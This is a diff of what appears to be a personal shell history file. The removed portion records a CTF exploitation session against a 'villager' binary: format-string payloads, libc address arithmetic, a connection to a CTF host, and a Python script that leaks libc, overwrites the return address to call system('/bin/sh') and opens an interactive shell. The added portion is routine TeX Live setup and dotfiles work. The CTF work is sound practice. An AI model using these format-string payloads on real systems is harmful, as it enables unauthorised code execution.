@@ -1,121 +1,3 @@
-gdb -q -batch -ex "p/x 0x1"
-gdb -q -batch -ex "x 0x1"
-gdb -q -batch -ex "p 0x1"
-gdb -q -batch -ex "p/d 0x1"
-gdb -q -batch -ex "p/d 0x0003fe70 - 0x0001a470"
-strings -tx libc.so.6 | grep '/bin/sh/'
-strings -tx libc.so.6 | grep '/bin/sh'
-gdb -q -batch -ex "p/d 0x1535aa - 0x1a470"
-gdb -q ./villager
-gdb -q villager
-echo -e "\xf1\x58\x55\56\xf2\x58\x55\56\xf3\x58\x55\56\xf4\x58\x55\56%52c%7$n%10c%8$n%239c%9$n%239c%10$n"
-echo -e "\xf1\x58\x55\56\xf2\x58\x55\56\xf3\x58\x55\56\xf4\x58\x55\56%52c%7$n%10c%8$n%239c%9$n%239c%10$n" | ./villager 
-echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%10c%8$n%239c%9$n%239c%10$n"
-echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%10c%8$n%239c%9$n%239c%10$n" | ./villager 
-echo -e "\x13\x5a\x55\x56"
-gdb -batch
-gdb -batch -q -ex "p"
-gdb -batch -q -ex "p 1 -2"
-gdb -batch -q -ex "p/d 0x44-16"
-echo $'\xf1\x58\x55\56%13c%7$n'
-python
-python3
-echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n" | ./villager 
-echo -e "\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n"
-echo $'\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n'
-echo $'\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n' | ./villager 
-echo $'\xf1\x58\x55\x56\xf2\x58\x55\x56\xf3\x58\x55\x56\xf4\x58\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n'
-echo $'\x13\x5a\x55\x56\x14\x5a\x55\x56\x15\x5a\x55\x56\x15\x5a\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n'
-echo $'\x13\x5a\x55\x56\x14\x5a\x55\x56\x15\x5a\x55\x56\x15\x5a\x55\x56%52c%7$n%239c%8$n%239c%9$n%239c%10$n' | ./villager 
-python3 script.py 
-echo -e "\x13\x5a\x55\x56" | ./villager 
-echo -e "\x13\x5a\x55\x56\x14\x5a\x55\x56\x15\x5a\x55\x56\x15\x5a\x55\x56%52c%7$n%10c%8$n%239c%9$n%239c%10$n" | ./villager 
-readelf -x villager 
-oj -x villager 
-od -x villager 
-objdujmp -x villager 
-objdump -x villager 
-readelf -r villager 
-nm -D libc.so.6
-locale
-/usr/bin/python3
-ldd villager 
-nm -D libc.so.6 | grep puts
-nm -D libc.so.6 | grep printf
-gdb ./villager -q
-objdump villager 
-objdump villager -s
-objdump villager -a
-objdump -a villager 
-objdump -d villager 
-objdump -d -M intel villager 
-python3 script.py 
-checksec
-sudo apt install checksec
-checksec --file=./villeger
-checksec --file=./villager
-ldd ./villager 
-echo $'\xe0\xe1\xb3\xf7%7$x' | ./villager 
-echo $'\xe0\xe1\xb3\xf7%7$p' | ./villager 
-nc ctfq.u1tramarine.blue 10023
-./villager |\x93\x8b\xff}\x93\x8b\xff~\x93\x8b\xff\x7f\x93\x8b\xff\x84\x93\x8b\xff\x85\x93\x8b\xff\x86\x93\x8b\xff\x87\x93\x8b\xff%80c%7$hhn%142c%8$hhn%189c%9$hhn%60c%10$hhn%179c%11$hhn%139c%12$hhn%152c%13$hhn%42c%14$hhn\n
-python3 script2.py 
-import struct
-import sys
-import telnetlib
-import time
-class Netcat:
-def interact(s):
-s = socket.create_connection(("ctfq.u1tramarine.blue", 10023))
-# nc = Netcat("ctfq.u1tramarine.blue", 10023)
-print("%s" % s.recv(1024).decode()) #Welcome
-print("%s" % s.recv(1024).decode()) #What's your name?
-s.send(b"%91$x\n")
-# %91%x f7b30569
-recv = s.recv(1024)
-print(recv)
-libc_main_addr = int(recv[4:].split(b" ")[0].split(b"\n")[0], 16) - 249
-print("libc_main_addr: %x" % libc_main_addr)
-system_addr = libc_main_addr + 154112
-print("system: %x" % system_addr)
-binsh_addr = libc_main_addr + 1282362
-print("/bin/sh: %x" % binsh_addr)
-print("%s" % s.recv(1024).decode()) #What's your name?
-s.send(b"%78$x\n")
-recv = s.recv(1024)
-ret_addr = int(recv[4:].split(b" ")[0].split(b"\n")[0], 16) - 44
-print("ret_addr: %x" % ret_addr)
-payload = set_payload_adress(ret_addr, 0)
-payload += set_payload_adress(ret_addr, 8)
-print(payload)
-b=[0,0,0,0]
-a=[0,0,0,0]
-for x in range(4):
-print(a)
-print(b)
-b[3] = ((b[3]-b[2]-1) % 0x100) + 1
-b[2] = ((b[2]-b[1]-1) % 0x100) + 1
-b[1] = ((b[1]-b[0]-1) % 0x100) + 1
-b[0] = ((b[0]-a[3]-1) % 0x100) + 1
-a[3] = ((a[3]-a[2]-1) % 0x100) + 1
-a[2] = ((a[2]-a[1]-1) % 0x100) + 1
-a[1] = ((a[1]-a[0]-1) % 0x100) + 1
-a[0] = ((a[0]-len(payload)-1) % 0x100) + 1
-index = 7
-payload += b"%%%dc%%%d$hhn" % (a[0], index)
-payload += b"%%%dc%%%d$hhn" % (a[1], index+1)
-payload += b"%%%dc%%%d$hhn" % (a[2], index+2)
-payload += b"%%%dc%%%d$hhn" % (a[3], index+3)
-payload += b"%%%dc%%%d$hhn" % (b[0], index+4)
-payload += b"%%%dc%%%d$hhn" % (b[1], index+5)
-payload += b"%%%dc%%%d$hhn" % (b[2], index+6)
-payload += b"%%%dc%%%d$hhn" % (b[3], index+7)
-payload += b"\n"
-print(payload)
-s.send(payload)
-time.sleep(0.1)
-interact(s)
-python3 script2.py 
 echo $'\x9cE\x83\xff\x9dE\x83\xff\x9eE\x83\xff\x9fE\x83\xff\xa4E\x83\xff\xa5E\x83\xff\xa6E\x83\xff\xa7E\x83\xff%192c%7$hhn%215c%8$hhn%234c%9$hhn%86c%10$hhn%35c%11$hhn%213c%12$hhn%195c%13$hhn%69c%14$hhn\n'
 nm -D libc.so.6 | grep printf
 nm _D libc.so.6 | grep __libc_start_main
@@ -1998,3 +1880,121 @@ ls
 python3 test.py 
 cat test.py 
 python3 test.py 
+sudo apt update
+sudo apt upgragde
+sudo apt upgrade
+sudo apt install texlive-full
+latexmk
+nvim
+~/dotfiles/ git pull
+cd ~/dotfiles/
+ls
+git pull
+fg
+nvim
+sudo kanji-config-updmap-sys ipaex
+ls
+fg
+git add .
+git commit update
+git commit -m update
+git push
+git config --global credential.helper 'cache --timeout=8,035,200'
+git push
+nvim
+cd univ/discrete_algo_lab/
+nvim
+apt list
+sudo apt uninstall
+sudo apt remove 
+sudo apt remove texlive-full
+wget http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz
+ls
+tar xvf install-tl-unx.tar.gz 
+cd install-tl-20221203/
+ls
+tlmgr
+which tlmgr
+man tlmgr
+sudo apt install texlive-full
+sudo tlmgr update --self --all
+tlmgr update --self --all
+tlmgr init-usertree
+tlmgr update --self --all
+tlmgr repository list
+wget https://mirror.ctan.org/systems/texlive/tlnet/update-tlmgr-latest.sh
+sudo kpsewhich --var-value=SELFAUTOPARENT
+echo $PATH
+sudo mkdir /usr/local/texlive
+cd /usr/local/texlive/
+ls
+wget http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz
+sudo wget http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz
+tar xvf install-tl-unx.tar.gz
+ls
+tar xvf install-tl-unx.tar.gz 
+sudo tar xvf install-tl-unx.tar.gz 
+cd install-tl-20221203/
+sudo ./install-tl -no-gui -repository http://mirror.ctan.org/systems/texlive/tlnet/
+tlmgr update --self --all
+sudo tlmgr update --self --all
+sudo tlmgr install   collection-latexrecommended collection-fontsrecommended collection-langjapanese   newtx txfonts helvetic fontaxes boondox   kastrup tex-gyre   here multirow letltxmacro   beamer bxdpx-beamer pgfplots   standalone
+ls
+nvim
+s
+ls
+cd ..
+ls
+rm -r texlive/
+ls
+cd texlive/
+ls
+cd ..
+rm -r texlive
+sudo rm -r texlive/
+ls
+sudo apt install texlive-lang-japanese
+sudo apt install texlive-latex-extra
+sudo apt install xdvik-ja 
+sudo apt install evince
+nvim
+sudo apt install xzdec 
+tlmgr init-usertree
+platex
+nvim
+cd ~/univ/discrete_algo_lab/latex/
+ls
+cd test/`
+cd ./3
+ls
+
+`
+cd test/`
+cd ./3
+ls
+
+`
+cd 3
+ls
+cd test/3/
+sudo tlmgr paper a4
+ls
+tlmgr init-usertree
+sudo tlmgr paper a4
+sudo tlmger init-usertree
+sudo tlmgr init-usertree
+sudo tlmgr paper a4
+nvim
+cd ~/dotfiles/
+ls
+mkdir latex
+ls
+mv ~/.latexmkrc ~/dotfiles/latex/
+ls
+stow -v latex
+ls
+nvim
+pip3 install neovim-remote
+fg
+nvim
+nvr
